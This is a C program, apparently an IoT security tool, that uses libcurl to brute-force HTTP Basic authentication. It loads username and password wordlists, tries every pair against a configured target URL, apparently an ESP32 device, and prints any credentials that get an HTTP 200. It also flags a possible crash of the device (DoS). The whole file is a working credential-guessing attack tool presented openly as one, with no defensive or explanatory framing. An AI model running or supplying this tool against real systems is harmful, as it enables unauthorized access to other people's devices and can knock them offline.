#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "brute.h"

static size_t write_noop(void *ptr, size_t size, size_t nmemb, void *userdata) {
    (void)ptr;
    (void)userdata;
    return size * nmemb;
}

static char *trim_line(char *line) {
    if (!line) {
        return NULL;
    }

    size_t len = strlen(line);
    while (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
        line[--len] = '\0';
    }

    return line;
}

static int load_wordlist(const char *path, char ***out_items, size_t *out_count) {
    FILE *file = fopen(path, "r");
    if (!file) {
        return -1;
    }

    size_t capacity = 16;
    size_t count = 0;
    char **items = malloc(sizeof(char *) * capacity);
    if (!items) {
        fclose(file);
        return -1;
    }

    char buffer[MAX_LINE_LEN];
    while (fgets(buffer, sizeof(buffer), file)) {
        trim_line(buffer);
        if (buffer[0] == '\0') {
            continue;
        }

        if (count >= capacity) {
            capacity *= 2;
            char **tmp = realloc(items, sizeof(char *) * capacity);
            if (!tmp) {
                for (size_t i = 0; i < count; ++i) {
                    free(items[i]);
                }
                free(items);
                fclose(file);
                return -1;
            }
            items = tmp;
        }

        items[count] = strdup(buffer);
        if (!items[count]) {
            for (size_t i = 0; i < count; ++i) {
                free(items[i]);
            }
            free(items);
            fclose(file);
            return -1;
        }
        count++;
    }

    fclose(file);
    *out_items = items;
    *out_count = count;
    return 0;
}

static void free_wordlist(char **items, size_t count) {
    if (!items) {
        return;
    }

    for (size_t i = 0; i < count; ++i) {
        free(items[i]);
    }
    free(items);
}

int main(void) {
    if (curl_global_init(CURL_GLOBAL_DEFAULT) != 0) {
        fprintf(stderr, "[ERROR] libcurl initialization failed.\n");
        return 1;
    }

    char **users = NULL;
    char **passwords = NULL;
    size_t user_count = 0;
    size_t password_count = 0;

    if (load_wordlist(USER_FILE, &users, &user_count) != 0) {
        fprintf(stderr, "[ERROR] File not found: %s\n", USER_FILE);
        curl_global_cleanup();
        return 1;
    }

    if (load_wordlist(PASS_FILE, &passwords, &password_count) != 0) {
        fprintf(stderr, "[ERROR] File not found: %s\n", PASS_FILE);
        free_wordlist(users, user_count);
        curl_global_cleanup();
        return 1;
    }

    printf("[*] Target: %s\n", TARGET_URL);
    printf("[*] Wordlists loaded: %zu users, %zu passwords.\n", user_count, password_count);
    printf("%s\n", "----------------------------------------");

    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "[ERROR] Failed to create CURL handle.\n");
        free_wordlist(users, user_count);
        free_wordlist(passwords, password_count);
        curl_global_cleanup();
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, TARGET_URL);
    curl_easy_setopt(curl, CURLOPT_HTTPAUTH, (long)CURLAUTH_BASIC);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_noop);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, TIMEOUT_SECONDS);

    int found = 0;

    for (size_t i = 0; i < user_count && !found; ++i) {
        for (size_t j = 0; j < password_count; ++j) {
            printf("[?] Testing: %s:%s    \r", users[i], passwords[j]);
            fflush(stdout);

            curl_easy_setopt(curl, CURLOPT_USERNAME, users[i]);
            curl_easy_setopt(curl, CURLOPT_PASSWORD, passwords[j]);

            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                printf("\n[!] Connection error. The ESP32 might have crashed (DoS).\n");
                found = -1;
                break;
            }

            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            if (http_code == 200) {
                printf("\n\n[!] SUCCESS!\n");
                printf("[!] Credentials: %s:%s\n", users[i], passwords[j]);
                found = 1;
                break;
            }
        }
    }

    if (found == 0) {
        printf("\n[X] Attack completed. No valid combination found.\n");
    }

    curl_easy_cleanup(curl);
    free_wordlist(users, user_count);
    free_wordlist(passwords, password_count);
    curl_global_cleanup();
    return (found == 1) ? 0 : 1;
}
